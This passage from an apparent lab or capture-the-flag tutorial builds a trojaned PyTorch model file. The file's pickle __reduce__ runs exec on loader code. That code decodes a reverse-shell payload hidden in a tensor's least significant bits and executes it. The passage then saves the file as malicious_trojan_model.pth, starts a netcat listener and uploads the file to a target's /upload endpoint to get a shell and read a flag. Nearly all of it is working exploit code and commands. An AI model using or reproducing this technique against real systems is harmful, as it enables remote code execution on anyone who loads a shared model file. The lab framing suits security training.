    except ValueError <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>: raise ValueError(f<span class="hljs-string">"Embedded LSB Decode failed: {e}"</span>) from <span class="hljs-built_in">e</span>
    except Exception <span class="hljs-keyword">as</span> e_inner: raise RuntimeError(f<span class="hljs-string">"Unexpected Embedded LSB Decode error: {e_inner}"</span>) from e_inner
<span class="hljs-string">""</span>"

        # Embed necessary data
        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
        embedded_target_key = repr(self.target_key)
        embedded_num_lsb = self.num_lsb
        <span class="hljs-keyword">print</span>(
            f<span class="hljs-string">"  [Reduce] Embedding {len(self.pickled_state_dict_bytes)} bytes of pickled state_dict."</span>
        )

        # Construct the loader code <span class="hljs-built_in">string</span>
        loader_code = f<span class="hljs-string">""</span>"
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
<span class="hljs-keyword">print</span>('[+] Trojan Wrapper: Loader code execution started.', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
{decode_lsb_source}
<span class="hljs-keyword">print</span>('[+] Trojan Wrapper: Embedded decode_lsb function defined.', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {embedded_target_key}
num_lsb = {embedded_num_lsb}
<span class="hljs-keyword">print</span>(f'[+] Trojan Wrapper: Embedded data retrieved (state_dict size={{len(pickled_state_dict_bytes)}}, target_key={{target_key!r}}, num_lsb={{num_lsb}}).', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
try:
    <span class="hljs-keyword">print</span>('[+] Trojan Wrapper: Deserializing embedded state_dict...', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    <span class="hljs-keyword">if</span> not isinstance(reconstructed_state_dict, dict):
        raise TypeError(<span class="hljs-string">"Deserialized object is not a dictionary (state_dict)."</span>)
    <span class="hljs-keyword">print</span>(f'[+] Trojan Wrapper: State_dict reconstructed successfully ({{len(reconstructed_state_dict)}} keys).', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    <span class="hljs-keyword">if</span> target_key not <span class="hljs-keyword">in</span> reconstructed_state_dict:
        raise KeyError(f<span class="hljs-string">"Target key '{{target_key}}' not found in reconstructed state_dict."</span>)
    payload_tensor = reconstructed_state_dict[target_key]
    <span class="hljs-keyword">if</span> not isinstance(payload_tensor, torch.Tensor):
         raise TypeError(f<span class="hljs-string">"Value for key '{{target_key}}' is not a Tensor."</span>)
    <span class="hljs-keyword">print</span>(f'[+] Trojan Wrapper: Located payload tensor (key={{target_key!r}}, shape={{payload_tensor.shape}}).', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    <span class="hljs-keyword">print</span>(f'[+] Trojan Wrapper: Decoding hidden payload from tensor using {{num_lsb}} LSBs...', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    <span class="hljs-keyword">print</span>(f'[+] Trojan Wrapper: Payload decoded successfully ({{len(extracted_payload_bytes)}} bytes).', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    extracted_payload_code = extracted_payload_bytes.<span class="hljs-keyword">decode</span>('utf-8', errors='<span class="hljs-keyword">replace</span>')
    <span class="hljs-keyword">print</span>('[!] Trojan Wrapper: Executing final decoded payload (reverse <span class="hljs-keyword">shell</span>)...', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
    exec(extracted_payload_code, globals(), locals())
    <span class="hljs-keyword">print</span>('[!] Trojan Wrapper: Payload execution initiated.', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()

except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:
    <span class="hljs-keyword">print</span>(f'[!!!] Trojan Wrapper: FATAL <span class="hljs-keyword">ERROR</span> during loader execution: {{<span class="hljs-keyword">e</span>}}', <span class="hljs-keyword">file</span>=sys.stderr);
    traceback.print_exc(<span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
finally:
    <span class="hljs-keyword">print</span>('[+] Trojan Wrapper: Loader code sequence finished.', <span class="hljs-keyword">file</span>=sys.stderr); sys.stderr.flush()
<span class="hljs-string">""</span>"
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"  [Reduce] Loader code string constructed with escaped inner braces."</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"  [Reduce] Returning (exec, (loader_code,)) tuple to pickle."</span>)
        <span class="hljs-keyword">return</span> (exec, (loader_code,))


<span class="hljs-keyword">print</span>(<span class="hljs-string">"TrojanModelWrapper class defined."</span>)
</code></pre>
<hr>
<h2 id="execute-the-attack">Execute the Attack</h2>
<hr>
<p>To actually execute the actually, we first need to create an instance of <code>TrojanModelWrapper</code>, and pass the entire <code>modified_state_dict</code> to its constructor, along with the <code>target_key</code> (specifying which tensor holds the payload, e.g., <code>&quot;large_layer.weight&quot;</code>), as well as the <code>NUM_LSB</code> used for encoding. The wrapper&#39;s <code>__init__</code> method pickles this entire <code>state_dict</code> and stores the resulting bytes internally.</p>
<p>We then save this <code>wrapper_instance</code> object to our final malicious file (<code>final_malicious_file</code>) using <code>torch.save()</code>. This file now contains the pickled representation of the <code>TrojanModelWrapper</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Ensure the modified state dict exists from the embedding step</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">"modified_state_dict"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> locals() <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> isinstance(modified_state_dict, dict):
    <span class="hljs-keyword">raise</span> NameError(
        <span class="hljs-string">"Critical Error: 'modified_state_dict' not found or invalid. Cannot create wrapper."</span>
    )
<span class="hljs-comment"># Ensure the target key used for embedding is correctly defined</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">"target_key"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> locals():
    <span class="hljs-keyword">raise</span> NameError(
        <span class="hljs-string">"Critical Error: 'target_key' variable not defined. Cannot create wrapper."</span>
    )

print(f<span class="hljs-string">"\n--- Instantiating TrojanModelWrapper ---"</span>)
<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># Create an instance of our wrapper class.</span>
    <span class="hljs-comment"># Pass the entire modified state dictionary, the key identifying the</span>
    <span class="hljs-comment"># payload tensor within that dictionary, and the LSB count.</span>
    <span class="hljs-comment"># The wrapper's __init__ pickles the state_dict internally.</span>
    wrapper_instance = TrojanModelWrapper(
        modified_state_dict=modified_state_dict,
        target_key=target_key,
        num_lsb=NUM_LSB,
    )
    print(<span class="hljs-string">"TrojanModelWrapper instance created successfully."</span>)
    print(
        <span class="hljs-string">"The wrapper instance now internally holds the pickled bytes of the entire modified state_dict."</span>
    )

<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    print(f<span class="hljs-string">"\n--- Error Instantiating Wrapper ---"</span>)
    print(f<span class="hljs-string">"Error: {e}"</span>)
    <span class="hljs-keyword">raise</span> SystemExit(<span class="hljs-string">"Failed to instantiate TrojanModelWrapper."</span>) <span class="hljs-keyword">from</span> e


<span class="hljs-comment"># Define the filename for our final malicious artifact</span>
final_malicious_file = <span class="hljs-string">"malicious_trojan_model.pth"</span>

print(f<span class="hljs-string">"\n--- Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---"</span>)
<span class="hljs-keyword">try</span>:
    torch.save(wrapper_instance, final_malicious_file)
    print(
        f<span class="hljs-string">"Final malicious Trojan file saved successfully to '{final_malicious_file}'."</span>
    )
    print(f<span class="hljs-string">"File size: {os.path.getsize(final_malicious_file)} bytes."</span>)

<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># Catch potential errors during the final save operation</span>
    print(f<span class="hljs-string">"\n--- Error Saving Final Malicious File ---"</span>)
    <span class="hljs-keyword">import</span> traceback

    traceback.print_exc()
    print(f<span class="hljs-string">"Error details: {e}"</span>)
    <span class="hljs-keyword">raise</span> SystemExit(<span class="hljs-string">"Failed to save the final malicious wrapper file."</span>) <span class="hljs-keyword">from</span> e
</code></pre>
<p>The only thing left is to execute the attack.</p>
<p>First we need to double-check the payload configuration. We must ensure the <code>HOST_IP</code> variable, set earlier when defining the payload, correctly points to the IP address of the machine where we will run our listener, and that this IP is reachable from the target&#39;s environment. Next, we start a network listener on our machine to catch the incoming reverse shell.</p>
<p>A common tool for this is <code>netcat</code>; run <code>nc -lvnp 4444</code>.</p>
<p>With the listener active, we upload our malicious model file to the spawned instance. The application exposes an <code>/upload</code> endpoint designed to receive model files. Use the Python script below (or a tool like <code>curl</code>) to perform the upload via an HTTP POST request.</p>
<p>Code: python</p>
<pre><code class="lang-python">import requests
import os
import traceback

api_url = <span class="hljs-string">"http://localhost:5555/upload"</span>  # <span class="hljs-keyword">Replace</span> with instance details

pickle_file_path = final_malicious_file

<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Attempting to upload '{pickle_file_path}' to '{api_url}'..."</span>)

# Check <span class="hljs-keyword">if</span> the malicious pickle <span class="hljs-keyword">file</span> exists locally
<span class="hljs-keyword">if</span> not os.path.exists(pickle_file_path):
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"\nError: File not found at '{pickle_file_path}'."</span>)
    <span class="hljs-keyword">print</span>(<span class="hljs-string">"Please ensure the file exists in the specified path."</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">print</span>(f<span class="hljs-string">"File found at '{pickle_file_path}'. Preparing upload..."</span>)
    # Prepare the <span class="hljs-keyword">file</span> <span class="hljs-keyword">for</span> upload <span class="hljs-keyword">in</span> the <span class="hljs-keyword">format</span> requests expects
    # The key 'model' must match the key expected <span class="hljs-keyword">by</span> the Flask <span class="hljs-keyword">app</span> (request.files['model'])
    files_to_upload = {
        <span class="hljs-string">"model"</span>: (
            os.path.basename(pickle_file_path),
            <span class="hljs-keyword">open</span>(pickle_file_path, <span class="hljs-string">"rb"</span>),
            <span class="hljs-string">"application/octet-stream"</span>,
        )
    }

    try:
        # Send the <span class="hljs-keyword">POST</span> request with the <span class="hljs-keyword">file</span>
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Sending POST request..."</span>)
        response = requests.<span class="hljs-keyword">post</span>(api_url, files=files_to_upload)

        # <span class="hljs-keyword">Print</span> the server's response details
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"\n--- Server Response ---"</span>)
        <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Status Code: {response.status_code}"</span>)
        try:
            # Try to <span class="hljs-keyword">print</span> JSON response <span class="hljs-keyword">if</span> available
            <span class="hljs-keyword">print</span>(<span class="hljs-string">"Response JSON:"</span>)
            <span class="hljs-keyword">print</span>(response.json())
        except requests.exceptions.JSONDecodeError:
            # Otherwise, <span class="hljs-keyword">print</span> raw text response
            <span class="hljs-keyword">print</span>(<span class="hljs-string">"Response Text:"</span>)
            <span class="hljs-keyword">print</span>(response.text)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"--- End Server Response ---"</span>)

        <span class="hljs-keyword">if</span> response.status_code == 200:
            <span class="hljs-keyword">print</span>(
                <span class="hljs-string">"\nUpload successful (HTTP 200). Check your listener for a connection."</span>
            )
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">print</span>(
                f<span class="hljs-string">"\nUpload failed or server encountered an error (Status code: {response.status_code})."</span>
            )

    except requests.exceptions.ConnectionError <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:
        <span class="hljs-keyword">print</span>(f<span class="hljs-string">"\n--- Connection Error ---"</span>)
        <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Could not connect to the server at '{api_url}'."</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Please ensure:"</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"  1. The API URL is correct."</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"  2. Your target instance is running and the port is mapped correctly."</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"  3. There are no network issues (e.g., firewall)."</span>)
        <span class="hljs-keyword">print</span>("  4. You have a listener running <span class="hljs-keyword">for</span> the connection.)
        <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Error details: {e}"</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"--- End Connection Error ---"</span>)

    except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:
        <span class="hljs-keyword">print</span>(f<span class="hljs-string">"\n--- An unexpected error occurred during upload ---"</span>)
        traceback.print_exc()
        <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Error details: {e}"</span>)
        <span class="hljs-keyword">print</span>(<span class="hljs-string">"--- End Unexpected Error ---"</span>)

    finally:
        # Ensure the <span class="hljs-keyword">file</span> handle opened <span class="hljs-keyword">for</span> upload is closed
        <span class="hljs-keyword">if</span> <span class="hljs-string">"files_to_upload"</span> <span class="hljs-keyword">in</span> locals() and <span class="hljs-string">"model"</span> <span class="hljs-keyword">in</span> files_to_upload:
            try:
                files_to_upload[<span class="hljs-string">"model"</span>][1].<span class="hljs-keyword">close</span>()
                # <span class="hljs-keyword">print</span>(<span class="hljs-string">"Closed file handle for upload."</span>)
            except Exception <span class="hljs-keyword">as</span> e_close:
                <span class="hljs-keyword">print</span>(f<span class="hljs-string">"Warning: Error closing file handle: {e_close}"</span>)

<span class="hljs-keyword">print</span>(<span class="hljs-string">"\nUpload script finished."</span>)
</code></pre>
<p>Upon successful upload, the server will attempt to load the model using <code>torch.load()</code>.</p>
<p>We should see an incoming connection on our <code>nc</code> listener. Once we have the shell connection, we can navigate the target&#39;s system to find and retrieve the flag (<code>cat /app/flag.txt</code>).</p>
<hr>
